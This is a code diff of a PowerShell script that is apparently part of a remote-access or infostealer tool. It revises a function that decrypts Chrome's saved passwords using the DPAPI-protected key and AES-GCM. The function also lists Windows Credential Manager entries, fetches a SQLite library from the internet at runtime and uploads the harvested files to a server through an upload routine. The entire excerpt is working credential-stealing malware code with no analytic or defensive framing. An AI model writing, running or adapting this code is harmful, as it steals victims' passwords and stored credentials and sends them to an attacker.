@@ -387,7 +387,7 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-    function Get-Credentials {
+    function Get-CredentialsFull {
     try {
         $outputFiles = @()
         $guid = $env:COMPUTERNAME
@@ -398,60 +398,77 @@ function PortSuggest {
         $chromeLogin = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
         if ((Test-Path $chromeLogin) -and (Test-Path $localState)) {
-            $state = Get-Content $localState -Raw | ConvertFrom-Json
-            $key = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                [Convert]::FromBase64String($state.os_crypt.encrypted_key)[5..],
-                $null, 'CurrentUser'
-            )
+            $stateRaw = Get-Content $localState -Raw | ConvertFrom-Json
+            $encKeyB64 = $stateRaw.os_crypt.encrypted_key
+            $encKey = [Convert]::FromBase64String($encKeyB64)
+            $encKey = $encKey[5..($encKey.Length - 1)] # Пропускаем DPAPI префикс
+            $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
 
-            $tempLogin = "$env:TEMP\login.db"
+            $tempLogin = "$env:TEMP\login_temp.db"
             Copy-Item $chromeLogin $tempLogin -Force
 
-            $outFile = Join-Path $basePath "chrome_passwords.txt"
-            $query = "SELECT origin_url, username_value, password_value FROM logins"
+            Add-Type -AssemblyName System.Data
+            $assemblyPath = "$env:TEMP\System.Data.SQLite.dll"
+            if (-not (Test-Path $assemblyPath)) {
+                $url = "https://github.com/npgsql/effort/raw/master/Libraries/System.Data.SQLite.dll"
+                Invoke-WebRequest -Uri $url -OutFile $assemblyPath -UseBasicParsing
+            }
+            Add-Type -Path $assemblyPath
+
             $conn = New-Object Data.SQLite.SQLiteConnection("Data Source=$tempLogin;Version=3;")
             $conn.Open()
-            $cmd = $conn.CreateCommand(); $cmd.CommandText = $query
+            $cmd = $conn.CreateCommand()
+            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+
             $reader = $cmd.ExecuteReader()
-            $lines = @()
+            $result = @()
             while ($reader.Read()) {
                 $url = $reader.GetString(0)
-                $user = $reader.GetString(1)
-                $enc = [byte[]]::new($reader.GetBytes(2,0,$null,0,0))
-                $reader.GetBytes(2,0,$enc,0,$enc.Length)
+                $username = $reader.GetString(1)
+                $enc = [byte[]]::new($reader.GetBytes(2, 0, $null, 0, 0))
+                $reader.GetBytes(2, 0, $enc, 0, $enc.Length)
+
                 if ($enc.Length -gt 15) {
-                    $nonce = $enc[3..14]; $ct = $enc[15..($enc.Length - 17)]; $tag = $enc[($enc.Length - 16)..]
+                    $nonce = $enc[3..14]
+                    $ct = $enc[15..($enc.Length - 17)]
+                    $tag = $enc[($enc.Length - 16)..($enc.Length - 1)]
+
                     $aes = [System.Security.Cryptography.AesGcm]::new($key)
                     $pt = [byte[]]::new($ct.Length)
                     $aes.Decrypt($nonce, $ct, $tag, $pt)
-                    $pass = [Text.Encoding]::UTF8.GetString($pt)
-                    $lines += \"$url`n[$user / $pass]`n\"
+                    $pass = [System.Text.Encoding]::UTF8.GetString($pt)
+                    $result += "[$url] $username : $pass"
                 }
             }
-            $reader.Close(); $conn.Close()
-            $lines | Out-File $outFile -Encoding UTF8
+            $reader.Close()
+            $conn.Close()
+
+            $outFile = Join-Path $basePath "chrome_passwords.txt"
+            $result | Out-File $outFile -Encoding UTF8
             $outputFiles += $outFile
         }
 
-        # === Windows Credentials ===
-        $cmdkeyOut = cmdkey /list | Select-String "Target:"
-        if ($cmdkeyOut) {
-            $winOut = Join-Path $basePath "windows_creds.txt"
-            $cmdkeyOut | ForEach-Object { $_.ToString().Trim() } | Out-File $winOut
+        # === Windows Credential Manager ===
+        $winOut = Join-Path $basePath "windows_creds.txt"
+        $targets = cmdkey /list | Select-String "Target:" | ForEach-Object { $_.ToString().Trim() }
+        if ($targets.Count -gt 0) {
+            $targets | Out-File $winOut -Encoding UTF8
             $outputFiles += $winOut
         }
 
-        # === Upload All Files ===
-        $result = @()
-        foreach ($f in $outputFiles) {
-            $result += Upload-File $f
+        # === Отправка на сервер ===
+        $uploads = @()
+        foreach ($file in $outputFiles) {
+            $uploads += Upload-File $file
         }
-        return $result -join \"`n\"
+
+        return $uploads -join "`n"
     }
     catch {
-        return \"[ERROR] Failed to extract credentials: $($_.Exception.Message)\"
+        return "[ERROR] Get-CredentialsFull failed: $($_.Exception.Message)"
     }
 }
+
 
     
     function Dump-WiFi {
